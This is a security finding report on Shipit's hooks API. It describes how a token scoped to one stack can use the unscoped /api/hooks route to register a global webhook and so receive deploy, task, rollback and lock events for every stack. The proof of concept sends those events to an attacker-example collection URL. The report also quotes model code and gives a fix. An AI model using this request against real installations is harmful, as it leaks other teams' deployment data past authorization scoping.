### Title
Stack-scoped API token can create a global webhook and read every other stack's deploy/task/rollback output - ([File: app/controllers/shipit/api/hooks_controller.rb])

### Summary
`Shipit::ApiClient` tokens can be scoped to a single stack via `stack_id`, restricting most operations (stacks, deploys, tasks) to that one stack. However, `Shipit::Api::HooksController` derives the hook's `stack_id` purely from the *route/param* (`params[:stack_id]`), not from the authenticated token's scope. Hitting the unscoped `/api/hooks` route (which also maps to this controller) lets any client holding only the `write:hook` permission create a hook with `stack_id: nil`, i.e. a **global** hook that is delivered every event for every stack in the installation, bypassing the client's stack scoping entirely.

### Finding Description
`Shipit::Api::BaseController#stacks` restricts a scoped client to its own stack: [1](#0-0) 

`Shipit::Api::HooksController`, however, computes the hook scope independently of that restriction: [2](#0-1) 

`stack_id` only calls the (correctly scoped) `stack` helper when `params[:stack_id]` is present. `config/routes.rb` exposes `HooksController` under two routes: a stack-scoped one (`/api/stacks/*stack_id/hooks`) and a completely unscoped one: [3](#0-2) 

When the unscoped route is used, `params[:stack_id]` is absent, so `stack_id` returns `nil` and `hooks` becomes `Hook.where(stack_id: nil)` — a **global** hook, independent of whatever stack (if any) the authenticated `ApiClient` is bound to. The only gate on this action is a global permission check, not a stack-scope check: [4](#0-3) 

Global hooks then receive events for **every** stack, because delivery matches `stack_id IN (nil, <stack>)`: [5](#0-4) 

`Hook.emit`/`Hook.deliver` is invoked for `task`, `deploy`, `rollback`, `lock`, `commit_status`, `deployable_status`, `merge_status`, `merge`, and `pull_request` events across the whole application (called from `Stack`, `ReviewStack`, `Commit`, `MergeRequest`, `PullRequest`, `Task`), so a global hook streams data (including deploy output links, commit SHAs, task status, lock reasons) for all stacks to whatever `delivery_url` the attacker controls.

### Impact Explanation
`ApiClient#stack_id` is the binding meant to guarantee "a stack a token authorises == a stack it touches." A client legitimately scoped to a single stack (e.g. a CI integration token an admin issued only for `owner/repo/production`) that is also granted `write:hook` — a permission unrelated to stack scope in `ApiClient::PERMISSIONS` — can call `POST /api/hooks` to create a hook with no `stack_id`, and thereby receive `task`/`deploy`/`rollback`/`lock`/`merge` events, including task/deploy output links, for every other stack managed by that Shipit instance, none of which it was authorized to read. This matches the High-impact category "unauthenticated read of stack state, task streams or deploy output" applied here as an authorization-scope escape (a low-privilege, single-stack token reading state of arbitrary other stacks it has no `read:stack`/`read:hook` grant for).

### Likelihood Explanation
The attack requires only an `ApiClient` token (basic-auth Authorization header per `Shipit::Api::BaseController#authenticate_api_client`) that carries `write:hook`, which is a normal, low-privilege grant for teams that want to wire up their own stack's notifications — no repository write access, GitHub credentials, or admin session is needed. Any such client can perform this in a single unauthenticated-relative-to-other-stacks API call.

### Recommendation
Scope hook creation strictly to the authenticated token: derive `stack_id` from `current_api_client.stack_id` when the client is stack-scoped (disallow creating a global hook at all in that case, or force `stack_id` to the client's own stack), and require `write:hook` together with an explicit stack-level permission check equivalent to the one used for stacks/deploys/tasks rather than a bare global permission.

### Proof of Concept
1. Admin issues an `ApiClient` scoped to `stack_id: <stack A>` with permissions `["read:stack", "write:hook"]` (a plausible, non-privileged configuration allowed by `ApiClient::PERMISSIONS`).
2. Attacker holding that token sends:
   ```
   POST /api/hooks
   Authorization: Basic <base64(client_id--token)>
   { "delivery_url": "https://attacker.example.com/collect", "events": ["deploy", "task", "rollback", "lock"] }
   ```
   This hits the unscoped `resources :hooks` route (`config/routes.rb:46`), not the stack-scoped one, so `params[:stack_id]` is absent.
3. `HooksController#stack_id` returns `nil`; the created `Hook` has `stack_id: nil` (global) per `app/controllers/shipit/api/hooks_controller.rb:46-52` and `app/models/shipit/hook.rb:93`.
4. Any subsequent deploy/rollback/task/lock event on *any* stack in the installation (e.g. `stack B`, which the token was never authorized for) triggers `Hook.deliver`, matching the global hook via `for_stack` (`stack_id: [nil, stack_id]`), and delivers the event payload (including deploy links/output URLs) to the attacker's `delivery_url`.

    scope :global, -> { where(stack_id: nil) }
    scope :scoped_to, ->(stack) { where(stack_id: stack.id) }
    scope :for_stack, ->(stack_id) { where(stack_id: [nil, stack_id]) }

    class << self
      def emit(event, stack, payload)
        raise "#{event} is not declared in Shipit::Hook::EVENTS" unless EVENTS.include?(event.to_s)

        Shipit::EmitEventJob.perform_later(
          event: event.to_s,
          stack_id: stack&.id,
          payload: coerce_payload(payload)
        )
        deliver_internal_hooks(event, stack, payload)
      end

      def deliver_internal_hooks(event, stack, payload)
        Shipit.internal_hook_receivers.each do |receiver|
          receiver.deliver(event, stack, payload)
        end
      end

      def deliver(event, stack_id, payload)
        for_stack(stack_id).listening_event(event).each do |hook|
          hook.deliver!(event, payload)
        end
      end
